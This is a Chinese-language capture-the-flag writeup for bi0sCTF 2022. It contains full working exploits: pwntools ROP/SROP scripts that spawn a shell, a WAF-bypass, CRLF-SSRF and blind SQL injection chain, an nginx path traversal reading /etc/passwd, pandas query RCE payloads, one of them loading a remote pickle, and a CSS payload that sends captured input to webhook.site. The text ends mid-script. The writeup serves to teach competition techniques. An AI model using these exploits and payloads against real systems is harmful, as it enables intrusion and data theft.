# bi0sCTF2022 Writeup

## 前言:

本次bi0sCTF 2022属于休闲玩玩,我们获得了第四名.其中有部分题目还是很有趣.现将师傅们的writeup整理如下,长期招新欢迎感兴趣的师傅简历`root@r3kapig.com`

![](https://imgur.com/NJL3VZx.png)

## Pwn:

### Notes:

(本题开始看的时间有点晚了,导致没有在比赛时间内完成,赛后整理writeup)

程序启动了两个线程，两个线程共用一段共享内存，然后等待两个线程执行完

![](https://imgur.com/xOISXmm.png)

漏洞点在于条件竞争，另一个线程可以在检查过后改掉size，从而造成栈溢出

比赛时的问题有三点:

1. 不知道怎么卡条件竞争的时间，爆破影响了数据流
2. 知道泄露Libc，但是返回main函数之后多个相同功能的进程在执行，乱了
3. 想到了SROP，但是当时想的是用read的返回值来控制rax，然后并没有可以直接用的read，只有read_input

条件竞争的时间可以用一次add和encrypt然后sleep(6)来卡，这样可以执行完第一个compare并发送sent，这样就保证了两个线程的时间基本是同步的，而无需爆破，然后sleep(2)通过检查后把size改掉，造成栈溢出

方法1:利用memcpy的参数变化来执行execve

如果控制size为0x3b0，memcpy的三个参数会是这样

![](https://imgur.com/Ve0iYqG.png)

结束以后的参数，可以看到rcx和rdx以及rsi的内容都是memcpy可以控制的，而syscall函数里会把rcx给rdx，把rdx给rsi，把rsi给rdi，所以只要控制系统调用号为59就可以了，具体的实现跟源码有关系（有点复杂）只能说赛后很碰巧看到了参数的内容貌似是可控的 ，赛中观察过这个点 但貌似当时的参数不行

![](https://imgur.com/HArQdtM.png)

![](https://imgur.com/IZsHwTb.png)

exp:

```py
from pwn import *

p = process('./notes')
#p=remote('pwn.chall.bi0s.in',37981)
libc=ELF('./libc.so.6')
elf=ELF('./notes')
context.log_level = 'debug'
context.arch = 'amd64'
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
def menu(ch):
    sla('Enter Choice: ',str(ch))
def add(id,name,size,cont):
    sl('1')
    sla('Enter Note ID: ',str(id))
    sa('Enter Note Name:',name)
    sla('Enter Note Size: ',str(size))
    sa('Enter Note Content: ',cont)
def delete(idx):
    menu(2)
    sla('Enter Note ID: ',str(idx))
def show(idx,name,cont):
    menu(3)
    sla('Enter Note ID: ',str(idx))
    sla('Note Name: ',name)
    sla('Enter Note Content: ', cont)
def edit(size,name):
    menu(4)
    sla('Enter Note Size: ',str(size))
    sla('Enter Name: ',name)
def encrypt(idx,cont):
    menu(5)
    sla('Enter Note ID: ',str(idx))
    sla('Enter Note Content: ',cont)

def decrypt(cont):
    return xor(cont, b"2111485077978050")
syscall=0x401bc2
poprdi=0x0000000000401bc0
poprbp=0x00000000004011ed
#gdb.attach(p,'b* 0x401B7A')
add(0,'aaa',0x20,'\x00'*8)
payload='\x00'*0x48+p64(poprdi)+p64(0x3b)+p64(elf.sym['syscall'])+'\x00'*0x330+'/bin/sh\x00'*4
encrypt(0,decrypt(payload))
sleep(6)
add(0,'aaa',0x20,'\x00'*8)
sleep(2)
edit(len(payload),'\x00'*8)
sleep(3)

p.interactive()
```

另外官方中给的方法是SROP(https://discord.com/channels/862962550169665568/1063844806977130596/1066734947768999946)，比赛中也想到了用SROP，只不过想用read的返回值来控制rax，忘了可以直接syscall了，先往bss段写一个/bin/sh，然后执行SROP即可.这里脚本参考了部分来自于sAsPeCt的脚本(https://discord.com/channels/862962550169665568/1063844806977130596/1066799179550171237)

exp:

```py
from pwn import *

p = process('./notes')
#p=remote('pwn.chall.bi0s.in',37981)
libc=ELF('./libc.so.6')
elf=ELF('./notes')
context.log_level = 'debug'
context.arch = 'amd64'
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
def menu(ch):
    sla('Enter Choice: ',str(ch))
def add(id,name,size,cont):
    sl('1')
    sla('Enter Note ID: ',str(id))
    sa('Enter Note Name:',name)
    sla('Enter Note Size: ',str(size))
    sa('Enter Note Content: ',cont)
def delete(idx):
    menu(2)
    sla('Enter Note ID: ',str(idx))
def show(idx,name,cont):
    menu(3)
    sla('Enter Note ID: ',str(idx))
    sla('Note Name: ',name)
    sla('Enter Note Content: ', cont)
def edit(size,name):
    menu(4)
    sla('Enter Note Size: ',str(size))
    sla('Enter Name: ',name)
def encrypt(idx,cont):
    menu(5)
    sla('Enter Note ID: ',str(idx))
    sla('Enter Note Content: ',cont)

def decrypt(cont):
    return xor(cont, b"2111485077978050")
syscall=0x401bc2
poprdi=0x0000000000401bc0
poprbp=0x00000000004011ed
gdb.attach(p,'b* 0x401B7A')
add(0,'aaa',0x20,'\x00'*8)
bss= 0x404100
frame = SigreturnFrame(kernel='amd64')
frame.rip = 0x401bc2 # syscall;
frame.rax = 59 # RT_SIGRETURN
frame.rdi = bss # /bin/sh
frame.rsi = 0x404200 # NULL
frame.rdx = 0x404208 # NULL

payload = b"A" * 64 + p64(0) + p64(poprdi) + p64(bss) + p64(0x4013D6) + p64(poprdi) + p64(15) + p64(elf.plt['syscall']) + bytes(frame)
encrypt(0,decrypt(payload))
sleep(6)
add(0,'aaa',0x20,'\x00'*8)
sleep(2)
edit(len(payload),'\x00'*8)
sleep(3)
sla(b"Sent", b"/bin/sh\x00")
sl('/bin/sh\x00')
sl('/bin/sh\x00')
p.interactive()
```

## Web:

### Vuln-Drive 2:

#### 分析:

首先简单看看docker-compose.yml，发现php环境在外网

根据networks配置可知waf与其他两个环境互通，frontend与app不互通

![](https://imgur.com/2YzLTfs.png)

#### 审计:

以下为了方便叙述思路，将调整讲解的顺序，其中会涉及到部分穿插

##### waf:

这个容器中运行了一个go程序

```go
package main

import (
        "fmt"
        "log"
        "net/http"
        "net/http/httputil"
        "net/url"
        "strings"
)
var invalid = [6]string{"'", "\"", ")", "(", ")","="}

func ProxyRequestHandler(proxy httputil.ReverseProxy) func(http.ResponseWriter, *http.Request) {
    return func(w http.ResponseWriter, r http.Request) {
                if(r.Header.Get("X-pro-hacker")!=""){
                     fmt.Fprintf(w, "Hello Hacker!\n")
                     return
                }
                if(strings.Contains(r.Header.Get("flag"), "gimme")){
                    fmt.Fprintf(w, "No flag For you!\n")
                    return
                }
                if(r.Header.Get("Token")!=""){
                    for _, x := range invalid {
                            if(strings.Contains(r.Header.Get("Token"), x)){
                                fmt.Fprintf(w, "Hello Hacker!\n")
                                return  
                            }

                        }
                }
                
        proxy.ServeHTTP(w, r)
    }
}

func main() {
        url, err := url.Parse("http://app:5000")
    if err != nil {
        fmt.Println(err)
    }
        proxy := httputil.NewSingleHostReverseProxy(url)

        http.HandleFunc("/", ProxyRequestHandler(proxy))
        http.HandleFunc("/admin", func(w http.ResponseWriter, r *http.Request) {
                fmt.Fprintf(w, "Hello World!\n")
})
        log.Fatal(http.ListenAndServe(":80", nil))
}
```

存在两个路由`/`与`/admin`，其中/路由将我们的请求转发到`http://app:5000`
同时对`header`中的`X-pro-hacker`、`flag`、`Token`三个字段做了限制

要求`X-pro-hacker`为空，`flag`不能出现`gimme`，`Token`则是不能有`[6]string{"'", "\"", ")", "(", ")","="}`这些字符

在python的flask项目中则要求`request.headers.get("X-pro-hacker")=="Pro-hacker" and "gimme" in request.headers.get("flag")`，注意一个是`==`一个是`in`

这里则需要利用go与flask解析的差异性，

go当中只获取第一个header的内容，

在flask当中会把header当中的`_`替换为`-`，同时如果header双写会用`,`进行拼接

因此我们如果构造这样的请求，则可以绕过go端的校验

```
GET / HTTP/1.1
X_pro-hacker: Pro-hacker
flag: 
flag: gimme
```

同时在flask眼中以上内容最终会转换为

```
GET / HTTP/1.1
X-pro-hacker: Pro-hacker
flag: ,gimme
```

接下来我们来具体看看flask部分

##### app:

首先在里面会初始化sqlite数据库，将flag保存到了users与flag两张表

```py
def init_db():
    try: 
        conn = sqlite3.connect(os.path.join(os.path.realpath(os.curdir),'users.db'))
        cursor = conn.cursor()
        result = cursor.executescript(f"""
            CREATE TABLE IF NOT EXISTS users  (
                                                    username  TEXT, 
                                                    token TEXT
                                                );
            CREATE TABLE IF NOT EXISTS flag  (
                                                flag_is_here  TEXT
                                            );                                                  
            Delete from users;
            Delete from flag;
            INSERT INTO users values ('user','some_randomtoken'),
                                    ('admi','some_randomtoken'),
                                    (
                                        'admin',
                                        '{FLAG}'
                                    );
            INSERT INTO flag values ('{FLAG}');
            """)
        conn.commit()
        return True
    except:
        return False
```

程序仅有一个路由，要求header中的`X-pro-hacker`、`flag`字段为指定内容

同时根据header中的参数`Token`做数据库的查询操作

另外我们可以看到如果存在user参数那么会取前38位执行add_user操作

```py
def add_user(user,token):
    q = f"INSERT INTO users values ('{user}','{token}')"
    db_query(q)
    return
  
@app.route("/")
def index():
    while not init_db():
        continue
    if request.headers.get("X-pro-hacker")=="Pro-hacker" and "gimme" in request.headers.get("flag"):
        try:
            if request.headers.get("Token"):         
                token = request.headers.get("Token")
                token = token[:16]
                token = token.replace(" ","").replace('"',"")
                if request.form.get("user"):
                    user = request.form.get("user")
                    user = user[:38]
                    add_user(user,token)            
                query = f'SELECT * FROM users WHERE token="{token}"'
                res = db_query(query)
                res = res.fetchone()
                return res[1] if res and len(res[0])>0  else "INDEX\n"
        except Exception as e:
            print(e) 
    return "INDEX\n"
```

首先是`request.form.get("user")`,这个是POST表单的参数，我们如何能成功传递呢？毕竟当前路由只支持`GET`请求

其实flask识别`request.form`是依据Header头是否是`Content-Type:application/x-www-form-urlencoded`来判断的，因此我们只要加上并把参数放在请求体当中即可
因此很明显我们需要通过sql注入获取到flag表中flag_is_here字段的内容，由于token在go端做了字符限制，我们考虑仅在user字段中执行注入

由于flag表中仅有一个flag_is_here字段，因此我们可以用*替代减少payload长度
由于add_user当中为insert那么我们就可以考虑插入再查询的方式，通过盲注获取数据
构造如下，发现刚好长度为36，还预留了两个长度的位置，(毕竟flag长度也不会超过1000，所以完全够用了)，通过下面的语句我们每次可以将flag的一个字符带入到user表中

![](https://imgur.com/YuhdDfd.png)

之后我们通过select语句查询单字符的token，如果不存在则返回`INDEX`，存在则返回token内容，不断重复上述步骤即可获取到flag所有内容

```py
query = f'SELECT * FROM users WHERE token="{token}"'
res = db_query(query)
res = res.fetchone()
return res[1] if res and len(res[0])>0  else "INDEX\n"
```

而这个配置文件仅仅只有一行，禁止直接访问uploads路径下的文件

```
Deny from all
```

接下来看看代码，简简单单只有几个文件

![](https://imgur.com/ON4zwfH.png)

接下来所有代码都为去除前端样式部分，仅保留php代码

登录页面接收username参数并保存到session当中，之后根据sessionid生成隔离用户目录

```php
//login.php
<?php
session_start();
if (!file_exists('uploads')) {
    mkdir('uploads');
}

if(isset($_POST['submit'])){
    if(isset($_POST['username'])){
        $_SESSION["username"] = $_POST["username"];
        $folder = './uploads/'.session_id()."/";
        if (!file_exists($folder)) {
          mkdir($folder);
        }  
        $_SESSION['folder'] = $folder;
        header("Location: /index.php");
        die();

    }else{
        echo "no username provided";
    }
}

?>
```

接下来是index.php部分，这里主要有两个功能一个是根据参数new创建文件夹，同时对参数new用check_name函数做了校验

```php
$FOLDER = $_SESSION['folder'];


//create new folder inside uploads using get parameter
if (isset($_GET['new'])) {
    if(check_name($_GET["new"])){
        $newfolder = $FOLDER.$_GET['new'];
        if (!file_exists($newfolder)) {
            
            mkdir($newfolder);
        }else{
            $error = "folder already exist";
        }
    }else{
        die('not allowed');
    }
}
check_name过滤了符号.与/，同时里面还调用了report函数
function check_name($filename){
    if(gettype($filename)==="string"){
        if(preg_match("/[.\/]/i",$filename)){
            report();
            return false;
        }else{
            return true; //safe
        }
    }
    else{
        return false;
    }
}

function report(){
    //report usename
    ini_set("from",$_SESSION['username']);
    file_get_contents('http://localhost/report.php');

}
```

另一个是文件上传功能，可以指定path上传文件，不过可惜也经过check_name做了校验，另一点文件名取后缀，并使用uniqid函数获取随机前缀，

因此我们便不能上传一些配置文件覆盖原来的htaccess下的配置

同时虽然对后缀没有过滤，由于本身有htaccess下的限制也无法访问到我们上传的文件

```php
if(isset($_POST["submit"])){
    if(isset($_FILES['file'])&& isset($_POST['path'])){
        if(!check_name($_POST["path"])){
            die("not allowed");
        }
        $file = $_FILES['file'];
        $fileName = $file['name'];
        $fileSize = $file['size'];
        $fileError = $file['error'];
        $fileExt = explode('.', $fileName);
        $fileActualExt = strtolower(end($fileExt));
        if($fileError === 0){
            if($fileSize < 100000){
                $name = uniqid('', true).".".$fileActualExt;
                $fileDestination = $FOLDER.$_POST['path'];
                upload($file['tmp_name'], $fileDestination,$name);
                header("Location: index.php?uploadsuccess");
            }else{
                $error =  "Your file is too big!";
            }
        }else{
            $error =  "There was an error uploading your file!";
        }
        
    }else{
        $error =  "parameter missing";
    }
}
```

最后是view.php，根据参数fol可以查看我们上传的文件名，同时也有check_name做路径限制

```php
$FOLDER = $_SESSION['folder'];
$dirr = ['.','..'];
if(isset($_GET['fol'])){
    
    //echo $FOLDER.$_GET['fol'];
    if(check_name($_GET['fol']) && is_dir($FOLDER.$_GET['fol'])){
        $c = "";
        $files = array_diff(scandir($FOLDER.$_GET['fol']),$dirr);
        foreach ($files as $f) {
            
            $c.= "<li class=\"list-group-item\"><a href='/view.php?file=".$_GET['fol']."/".$f."'>$f</a></li>";

        }
        echo str_replace("CONTENT",$c,$files_template);
    }else{
        echo '<div class="alert alert-warning" role="alert">folder not found</div>';
    }
}
```

根据参数file可以查看对应的文件内容，不过有限制只能读取后缀为txt、png与jpg后缀的文件

如果注意看可以看到这里type的写法有点小问题给了我们操作的空间 ，后面会提到

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $ext = explode('.', $file);
    $type = substr(strtolower(end($ext)),0,3);
    $file = $FOLDER."/".$file;
    if($type==="txt"){
        try {
            if(file_exists($file)){
                chdir($FOLDER);
                echo file_get_contents($_GET['file']);
            }else{
                echo '<div class="alert alert-warning" role="alert">File not found!</div>';
            }
        } catch (\Throwable $th) {
           echo '<div class="alert alert-warning" role="alert">Some error Occured</div>';
        }
        
    }
    else if($type==="png" || $type==="jpg"){

        try {
            if(file_exists($file)){
                chdir($FOLDER);
                echo "<img src=\"data:image/$type;base64,".base64_encode(file_get_contents($_GET['file']))."\" >";
            }else{
                echo '<div class="alert alert-warning" role="alert">File not found!</div>';
            }
        } catch (Throwable $th) {
            echo '<div class="alert alert-warning" role="alert">Some error Occured</div>';
        }
        
    }
    else{
        echo '<div class="alert alert-warning" role="alert">Invaild type</div>';
    }

}
```

#### SSRF:

既然不能rce，那有什么办法呢？ssrf同时又能控制header

答案在report函数中

```php
function report(){
    //report usename
    ini_set("from",$_SESSION['username']);
    file_get_contents('http://localhost/report.php');

}
```

可以在网上搜索到这个https://bugs.php.net/bug.php?id=81680

从漏洞描述可以看到妥妥的CRLF注入

> When we set "From" field by setting ini setting "from", which is used for "ftp" and "http" file wrapper, it can inject an arbitrary string in the raw socket message.
Since the injected string can contain CR-LF sequence(\r\n), this can be used to interrupt the flow of FTP stream or injecting/smuggling an outgoing HTTP request.

同时下面还给了一个简洁的例子，从这里可以看到我们注入的Header在最上方，那么岂不是想控制啥控制啥嘞

![](https://imgur.com/z8aR8mE.png)

##### 为什么不能污染HOST

然而当我们简单构造好username发过去触发report后会发现什么都没发生

这里我们先本机测试下

```php
<?php

/**
 * Author: Y4tacker
 */
function report($username){
    ini_set("from",$username);
    file_get_contents('http://ip:1234/report.php');


}


if(isset($_POST['name'])){
    report($_POST['name']);
};
```

明明Host当中端口已经变了，为什么还是1234呢？

![](https://imgur.com/PaYspRw.png)

经过简单的php源码调试我们可以发现:

事实上其实在发送数据前，php已经根据我们的url与对应ip和port建立好了连接

![](https://imgur.com/oFgOB8A.png)

之后再发送完整数据包

![](https://imgur.com/YyspUHt.png)

因此不论我们如何污染Host都是在原有的tcp连接上进行的通信

那我们怎么办呢？虽然能成功CRLF注入，但如何控制HOST呢？

##### 成功的SSRF 尝试:

纵观全局所有代码，我们只能看到view.php当中存在可控制的点

还记得我们之前说这个获取$type存在问题么？

![](https://imgur.com/P66R6Bx.png)

乍一看这里逻辑本来是判断后缀后，判断文件是否存在之后再读取，看着没什么问题呀？

而问题就在于这个type是取`.`后的三个字符

那么如果我们创建一个名为`http:`的文件夹

之后让file值等于`http://xxx.xxx.xxx.txt@waf`，这样看也许不明显，那如果我们看看绝对路径呢？

`/var/www/html/uploads/sessionid/http://xxx.xxx.xxx.txt@waf`

我们知道php通常会做路径标准化，`//`会被替换成`/`，那么这个路径

`/var/www/html/uploads/sessionid/http:/xxx.xxx.xxx.txt@waf`

这样也就能通过file_exists函数了

#### Exp:

结合完整攻击路径将以上步骤串联起来写出exp

```py
import io
import re
import requests

flag = ''
base_url = 'http://web.chall.bi0s.in:8000'
flag_chars = 'abcdef0123456789'
hijack_tpl = '\r\n'.join([
    'anything',                  # could be anything(including '')
    'X_pro-hacker: Pro-hacker',  # bypass waf, flask will replace underscore with dash
    'flag: bypass-waf',          # the waf only takes the first flag in HTTP header
    'flag: gimme',               # but flask puts headers with the same name into a array
    'Host: just-need-this-header',
    'Content-Type:application/x-www-form-urlencoded',
    'Token: {}',
    'Content-Length: {}',        # with Content-Length set to len(payload)
    '',                          # and 2 CRLFs marking the end of header
    '{}',                        # to control the HTTP body
])

for i in range(9):  # from the challenge description we know len(flag) == 9
    for token in flag_chars:
        with requests.Session() as s:
            sqli = f"user=a',substr((select * from flag),{i + 1},1))-- "
            username = hijack_tpl.format(token, len(sqli), sqli)

            # login
            s.post(f"{base_url}/login.php",
                   data={'username': username, 'submit': ''})

            # create folder
            s.get(f'{base_url}/index.php?new=http:')

            # upload txt
            s.post(f'{base_url}/index.php',
                   data={'path': 'http:', 'submit': ''},
                   files={'file': ('.txt@waf', io.BytesIO())})  # an empty file-like object is ok

            # get txt file name
            txt = re.search(r"@waf'>(?P<txt>[^<]*)",
                            s.get(f"{base_url}/view.php?fol=http:").text).group('txt')

            # ssrf -> bypass waf -> blind sqli, fol=. or fol=/
            if 'INDEX' not in s.get(f"{base_url}/view.php?fol=.&file=http://{txt}").text:
                flag += token
                print(f"bi0sctf{{{flag}}}", end='\r')
                break

print()

```

### PyCGI(misc?):

#### 任意文件读取:

这道题的附件很简单，在 `nginx.conf` 里面可以发现一个任意文件读取：

```
ocation /static {
    alias /static/;
}
```

通过 `curl http://instance.chall.bi0s.in:10332/static../etc/passwd --path-as-is` 就可以实现任意文件读取。

#### 探索题目环境:

由于题目附件给的东西很少，所以需要我们自己利用任意文件读取去取环境里面的东西，在靶机的根目录下有三个文件夹

![](https://imgur.com/m5owfxb.png)

`cgi-bin` 需要 HTTP 认证暂时先跳过, `database` 下面是一个 csv，`templates` 打开有一个 form

![](https://imgur.com/SpQN9wR.png)

提交之后会跳转到一个 404 的路径 `http://instance.chall.bi0s.in:10332/templates/search_currency.py?currency_name=a`，猜测 `cgi-bin` 下有一个 `search_currency.py`，于是通过任意文件读取拿到了 `/panda/cgi-bin/search_currency.py`

```py
#!/usr/bin/python3

from server import Server
import pandas as pd

try:
    df = pd.read_csv("../database/currency-rates.csv")
    server = Server()
    server.set_header("Content-Type", "text/html")
    params = server.get_params()
    assert "currency_name" in params
    currency_code = params["currency_name"]
    results = df.query(f"currency == '{currency_code}'")
    server.add_body(results.to_html())
    server.send_response()
except Exception as e:
    print("Content-Type: text/html")
    print()
    print("Exception")
    print(str(e))
```

同样的方法可以拿到 `server.py`:

```py
from os import environ

class Server:
    def __init__(self):
        self.response_headers = {}
        self.response_body = ""
        self.post_body = ""
        self.request_method = self.get_var("REQUEST_METHOD")
        self.content_length = 0

    def get_params(self):
        request_uri = self.get_var("REQUEST_URI") if  self.get_var("REQUEST_URI") else ""
        params_dict = {}
        if "?" in request_uri:
            params = request_uri.split("?")[1]
            if "&" in params:
                params = params.split("&")
                for param in params:
                    params_dict[param.split("=")[0]] = param.split("=")[1]
            else:
                params_dict[params.split("=")[0]] = params.split("=")[1]
        return params_dict

    def get_var(self, variable):
        return environ.get(variable)

    def set_header(self, header, value):
        self.response_headers[header] = value

    def add_body(self, value):
        self.response_body += value

    def send_file(self, filename):
        self.response_body += open(filename, "r").read()

    def send_response(self):
        for header in self.response_headers:
            print(f"{header}: {self.response_headers[header]}\n")

        print("\n")
        print(self.response_body)
        print("\n")
```

代码很简单，而且我们能够控制的地方并不多，大概率是通过 df.query() 实现 rce，但在此之前需要先解决 HTTP 认证的问题。

#### HTTP 认证:

由于 `/cgi-bin` 是需要通过 HTTP 认证的，所以首先想到通过 `static../etc/.htpasswd` 拿到 `.htpasswd`，这里有一个比较坑的地方，虽然密码只有一位，但是不是一个 ASCII 字符，通过一般的字典爆破解不出来。

后来主办方更新了附件，提供了 `Dockerfile`，发现并没有在构建容器的时候就生成 `.htpasswd`，于是想到去拿 `/docker-entrypoint.sh`

![](https://imgur.com/USX5pzQ.png)

可以发现 admin 的密码是 `\xc2\xad`，通过 `base64.b64encode(b'admin:\xc2\xad')` 生成 HTTP 认证头 `Authorization: Basic YWRtaW46wq0=`，测试通过 HTTP 认证

![](https://imgur.com/hmSbUPh.png)

#### pandas rce:

在文档(https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.query.html)中可以看到这样一句话：

> You can refer to variables in the environment by prefixing them with an ‘@’ character like `@a + b`.

所以我们可以把引号闭合之后通过 `@` 来实现 rce，方法就很多了，但还是有几点要注意一下：

- 因为是直接通过 nginx 传给 cgi，所以不需要 url 编码
- 由于 `server.py` 里面是通过 `=` 来分割字符的，所以不能在 payload 里面出现 `=`

这里收集一些 payload：

```py
'+@pd.eval('__import__("os").system("ls /")','python','python',True,@pd.__builtins__)+'

a'+(@server.__class__.__init__.__globals__['__spec__'].loader.__init__.__globals__['sys'].modules['os'].popen('ls /').read())#

'and@'pd'.annotations.__class__.__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls > /tmp/test")') or '

'+(@pd.io.common.os.popen('ls > /tmp/ls').read())+'

'|@pd.read_pickle('http://exp-server/output.exploit')|'

'or[].__class__.__base__.__subclasses__()[145].__init__([].__class__.__base__.__subclasses__()[145]).__class__.__name__<'1'or@server.add_body([].__class__.__base__.__subclasses__()[145]._module.sys.modules["subprocess"].check_output(["ls","-l", "/"]).decode()).__class__.__name__<'

'+@__builtins__.exec('import\x20os;raise\x20Exception(os.listdir(\"/\"))')+'
```

这些 payload 按照 source 可以分为利用 `@` 调用上下文中存在的函数或变量和利用字面量两种，而按照 sink 又可分为直接通过 `os.system()` ， `os.popen()` 等直接利用和通过 pickle 利用两类，限制比较少，利用方式很多非常灵活。大多数利用方式都比较常见，下面对 pandas 的利用做一些记录。

##### pd.eval:

通过官方文档（https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.eval.html#pandas.eval）我们可以发现它跟 python 的内置 eval 差不多，在接受 expr 参数的同时也支持设置 `globals` 和 `locals`。不同的是，pandas 在性能的考量下还实现了自己的 parser 和 engine，但是我们可以将这两个参数都设置成 `'python'` 来运行 builtin 的 eval。

##### pd.io.common.os:

其实这个算不上对于 pandas 的利用，只是通过 pandas 造了一个链去获取 `os`，类似的 gadget 还有很多，比如：`'+(@pd.core.config_init.os.popen('calc').read())+'`

![](https://imgur.com/yYTtOQx.png)

##### pd.read_pickle:

这个其实是对于 pickle 反序列化漏洞的利用，可以在 pandas 的源码（https://github.com/pandas-dev/pandas/blob/v1.5.3/pandas/io/pickle.py#L189）中看到，这个函数其实就是对于 `pickle.load` 的一个封装，可以利用现有的 pickle exp 进行利用

### Emo-Locker:

审计源代码，发现存在CSS注入漏洞

```javascript
this.setState((prevState) => {
    let href = `https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/${
        window.location.hash.replace("#", '')
    }-mode.css`;
    prevState.link_obj.href = href;
    return {}
});
```

通过构造形如`#../../gh/thezzisu/assets/public/css/902.css?`的hash可以注入我们可控的CSS文件。

观察到在点击emoji图标后，对应的`<span>`会被清空。使用CSS伪选择器`:empty`配合设置background-img即可向可控的url发送请求。

使用的payload如下：

```javascript
span[aria-label="1"]:empty {
  background-image: url("https://webhook.site/0b13d0cd-8f43-472c-98ac-de23aba8b2c2/?img=1");
}
/* multiple repeated items... */
```

即可获取admin bot输入的emoji密码内容，使用用户名admin即可登录并在返回的HTTP Response Header中获得flag。

## Reverse:

### lowkeyEnc:

读取文件后，先对明文做了两次AES256 CBC加密，随后每一位与索引进行异或，最后根据密文生成图片

动调后得到AES加密的密钥与iv，同时图片最后一行的rgb颜色对应了密文的每一位字节

```python
key = [
    0x52, 0xFD, 0xFC, 0x07, 0x21, 0x82, 0x65, 0x4F, 0x16, 0x3F, 
    0x5F, 0x0F, 0x9A, 0x62, 0x1D, 0x72, 0x95, 0x66, 0xC7, 0x4D, 
    0x10, 0x03, 0x7C, 0x4D, 0x7B, 0xBB, 0x04, 0x07, 0xD1, 0xE2, 
    0xC6, 0x49
]

iv = [
    0x81, 0x85, 0x5A, 0xD8, 0x68, 0x1D, 0x0D, 0x86, 0xD1, 0xE9, 
    0x1E, 0x00, 0x16, 0x79, 0x39, 0xCB
]

cipherText = []

from PIL import Image

image = Image.open('enc.png')

for i in range(100):
    r, g, b, a = image.getpixel((i, 99))
    if a != 0:
        cipherText.append(r)

for i in range(len(cipherText)):
    cipherText[i] ^= i

from Crypto.Cipher import AES

cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))

plainText = cipher.decrypt(bytes(cipherText))
print (plainText)
cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))

plainText = cipher.decrypt(plainText[:-16])
print (plainText)
```

### Rusted:

对输入进行sm4_cbc加密，key = `554248506A424B6C73513254754E536B`, iv= `3779304D3639545153636D376D665876`, 根据加密后的内容动态生成汇编代码函数，比如加密后的内容为
`1111111122222222333333334444444455555555666666667777777788888888` ，生成的代码就是下面那样的

```asm
[heap]:000055BA5DF3C000 sub_55BA5DF3C000 proc near
[heap]:000055BA5DF3C000 mov     rax, 11111111h
[heap]:000055BA5DF3C007 mov     rcx, 0FFFFFFFF93A3F3CDh
[heap]:000055BA5DF3C00E sub     rax, rcx
[heap]:000055BA5DF3C011 mov     rcx, 22222222h
[heap]:000055BA5DF3C018 add     rax, rcx
[heap]:000055BA5DF3C01B mov     rcx, 1337BEEFh
[heap]:000055BA5DF3C022 xor     rax, rcx
[heap]:000055BA5DF3C025 mov     rcx, 33AEF5CBh
[heap]:000055BA5DF3C02C sub     rax, rcx
[heap]:000055BA5DF3C02F mov     rcx, 33333333h
[heap]:000055BA5DF3C036 add     rax, rcx
[heap]:000055BA5DF3C039 mov     rcx, 44444444h
[heap]:000055BA5DF3C040 mov     rdx, 55555555h
[heap]:000055BA5DF3C047 mov     rbx, rax
[heap]:000055BA5DF3C04A xor     rax, rdx
[heap]:000055BA5DF3C04D xor     rbx, rcx
[heap]:000055BA5DF3C050 mov     rdx, 550D68CEh
[heap]:000055BA5DF3C057 sub     rax, rdx
[heap]:000055BA5DF3C05A mov     rdx, 5F9751EBh
[heap]:000055BA5DF3C061 sub     rbx, rdx
[heap]:000055BA5DF3C064 add     rax, rbx
[heap]:000055BA5DF3C067 mov     rcx, 66666666h
[heap]:000055BA5DF3C06E mov     rdx, 77777777h
[heap]:000055BA5DF3C075 add     rcx, rax
[heap]:000055BA5DF3C078 add     rdx, rax
[heap]:000055BA5DF3C07B mov     rax, 0FFFFFFFF88888888h
[heap]:000055BA5DF3C082 xor     rdx, rax
[heap]:000055BA5DF3C085 xor     rcx, rax
[heap]:000055BA5DF3C088 mov     rax, 4AA34A4h
[heap]:000055BA5DF3C08F mov     rbx, 2C786553h
[heap]:000055BA5DF3C096 sub     rbx, rdx
[heap]:000055BA5DF3C099 sub     rax, rcx
[heap]:000055BA5DF3C09C add     rax, rbx
[heap]:000055BA5DF3C09F mov     rcx, 33333333h
[heap]:000055BA5DF3C0A6 add     rax, rcx
[heap]:000055BA5DF3C0A9 mov     rcx, 44444444h
[heap]:000055BA5DF3C0B0 mov     rdx, 55555555h
[heap]:000055BA5DF3C0B7 xor     rax, rdx
[heap]:000055BA5DF3C0BA xor     rax, rcx
[heap]:000055BA5DF3C0BD mov     rbx, 74180051h
[heap]:000055BA5DF3C0C4 sub     rax, rbx
[heap]:000055BA5DF3C0C7 mov     rcx, 66666666h
[heap]:000055BA5DF3C0CE add     rax, rcx
[heap]:000055BA5DF3C0D1 mov     rcx, 77777777h
[heap]:000055BA5DF3C0D8 mov     rdx, 0FFFFFFFF88888888h
[heap]:000055BA5DF3C0DF xor     rax, rdx
[heap]:000055BA5DF3C0E2 xor     rax, rcx
[heap]:000055BA5DF3C0E5 mov     rbx, 3E07994Ch
[heap]:000055BA5DF3C0EC sub     rax, rbx
[heap]:000055BA5DF3C0EF retn
[heap]:000055BA5DF3C0EF
[heap]:000055BA5DF3C0EF sub_55BA5DF3C000 endp
```

根据上述代码和提示，写出脚本即可

```python
from gmssl.sm4 import CryptSM4, SM4_DECRYPT
import z3

i = [z3.BitVec(f'i{_}', 64) for _ in range(8)]
solver = z3.Solver()
solver.add(i[0] - 0x93A3F3CD == 0)
solver.add((i[1] ^ 0x1337BEEF) - 0x33AEF5CB == 0)
solver.add((i[2] ^ i[4]) - 0x550D68CE == 0)
solver.add((i[2] ^ i[3]) - 0x5F9751EB == 0)
solver.add(0x2C786553 - (i[6] ^ i[7]) == 0)
